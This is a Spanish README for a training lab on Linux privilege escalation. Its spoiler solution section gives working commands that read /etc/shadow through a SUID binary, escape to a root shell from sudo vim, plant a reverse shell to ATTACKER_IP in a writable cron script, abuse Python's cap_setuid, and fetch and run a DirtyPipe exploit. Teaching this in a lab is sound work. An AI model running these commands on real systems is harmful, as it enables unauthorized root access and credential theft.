# 🔐 Lab 01: Escalada de Privilegios Linux

## Objetivo

Practicar técnicas de escalada de privilegios en Linux explotando configuraciones vulnerables comunes.

## Escenario

Eres un atacante que ha obtenido acceso inicial como usuario de bajo nivel (`lowuser`). Tu objetivo es escalar privilegios hasta `root`.

## Entorno

- **Sistema:** Ubuntu 22.04 LTS
- **Usuario inicial:** `lowuser` (contraseña: `lowuser123`)
- **Target:** Obtener acceso `root`

## Vulnerabilidades Configuradas

| # | Vulnerabilidad | Categoría | Dificultad |
|---|----------------|-----------|------------|
| 1 | SUID binario vulnerable | SUID/SGID | ⭐ Fácil |
| 2 | Sudo sin password | Sudo Abuse | ⭐ Fácil |
| 3 | Cron job con PATH manipulation | Cron | ⭐⭐ Media |
| 4 | Binary con capabilities | Capabilities | ⭐⭐ Media |
| 5 | Kernel vulnerable (DirtyPipe) | Kernel Exploit | ⭐⭐⭐ Difícil |

## Inicio Rápido

```bash
# Levantar el entorno
docker compose up -d

# Obtener shell del contenedor
docker compose exec lowuser bash

# Verificar usuario actual
whoami
id
```

## Instrucciones

### Paso 1: Enumeración Inicial

```bash
# Verificar usuario y grupos
id
groups

# Ver sistema operativo
cat /etc/os-release
uname -a

# Buscar archivos SUID
find / -perm -4000 -type f 2>/dev/null

# Verificar sudo
sudo -l

# Buscar archivos con capabilities
getcap -r / 2>/dev/null
```

### Paso 2: Explotar Vulnerabilidades

Sigue el orden de dificultad:

1. **SUID** → Revisa `/usr/local/bin/` para binarios personalizados
2. **Sudo** → Usa `sudo -l` para ver qué puedes ejecutar
3. **Cron** → Revisa `/etc/cron*` y busca scripts ejecutables
4. **Capabilities** → Revisa las capabilities encontradas en el paso 1
5. **Kernel** → Si las anteriores fallan, intenta DirtyPipe

### Paso 3: Obtener Root

```bash
# Una vez explotada una vulnerabilidad
whoami  # Debería mostrar "root"

# Leer la flag
cat /root/flag.txt
```

## Solución

<details>
<summary>🔍 Click para ver la solución (spoiler)</summary>

### Vulnerabilidad 1: SUID

```bash
# Encontrar binario SUID personalizado
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/backup-manager

# Verificar qué hace
file /usr/local/bin/backup-manager
strings /usr/local/bin/backup-manager

# Explotar (copia /etc/shadow o ejecuta comandos como root)
/usr/local/bin/backup-manager -f /etc/shadow
```

### Vulnerabilidad 2: Sudo

```bash
# Ver permisos sudo
sudo -l
# lowuser ALL=(root) NOPASSWD: /usr/bin/vim

# Escalar con vim
sudo vim -c ':!/bin/bash'
```

### Vulnerabilidad 3: Cron PATH

```bash
# Ver cron jobs
cat /etc/crontab
# * * * * * root /opt/backup.sh

# Verificar si /opt/backup.sh es escribible
ls -la /opt/backup.sh

# Si es escribible, agregar reverse shell
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
```

### Vulnerabilidad 4: Capabilities

```bash
# Ver capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3 cap_setuid+ep

# Escalar con Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Vulnerabilidad 5: DirtyPipe (Kernel Exploit)

```bash
# Verificar versión del kernel
uname -r
# Vulnerable si es 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102

# Descargar y compilar exploit
wget https://github.com/Arinerron/CVE-2022-0847/raw/master/degroot-hairpin/dirtypipe.c
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1 "root2::0:0::/root:/bin/bash"
```

</details>

## Criterios de Éxito

- [ ] Obtener acceso root
- [ ] Leer `/root/flag.txt`
- [ ] Documentar cada vulnerabilidad explotada
- [ ] Identificar al menos 3 técnicas de mitigación

## Mitigaciones

| Vulnerabilidad | Mitigación |
|----------------|------------|
| SUID | Eliminar SUID innecesarios, usar `nosuid` en montajes |
| Sudo | Auditar `/etc/sudoers`, usar principle of least privilege |
| Cron | Validar scripts en cron, restringir permisos |
| Capabilities | Revisar capabilities periódicamente |
| Kernel | Mantener kernel actualizado |

## Limpieza

```bash
# Detener y eliminar el entorno
docker compose down -v --rmi all
```

---

*Lab creado para fines educativos — CyberDefense-Pro-Network*
